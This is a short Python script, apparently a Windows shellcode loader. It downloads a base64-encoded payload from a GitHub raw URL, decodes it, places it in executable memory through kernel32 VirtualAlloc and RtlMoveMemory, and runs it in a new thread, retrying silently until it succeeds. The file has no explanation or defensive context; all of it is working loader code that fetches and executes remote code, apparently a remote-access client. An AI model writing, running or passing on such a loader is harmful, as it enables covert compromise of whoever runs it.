import sys
import ctypes
import base64
import ctypes.wintypes as wt
import urllib.request

kernel32 = ctypes.windll.kernel32

kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
kernel32.VirtualAlloc.restype = wt.LPVOID

kernel32.CreateRemoteThread.argtypes = (
    wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID
)
kernel32.CreateRemoteThread.restype = wt.HANDLE

kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
kernel32.RtlMoveMemory.restype = None

kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
kernel32.WaitForSingleObject.restype = wt.DWORD

while True:
    try:
        buf = base64.b64decode(urllib.request.urlopen('https://raw.githubusercontent.com/poseidon1338/x/refs/heads/main/XClientXB.b64').read().decode('utf-8'))
        memAddr = kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40)
        kernel32.RtlMoveMemory(memAddr, buf, len(buf))
        th = kernel32.CreateThread(
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.c_void_p(memAddr),
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.pointer(ctypes.c_int(0))
                )
        
        kernel32.WaitForSingleObject(th, -1)
        break
    except Exception:
        continue
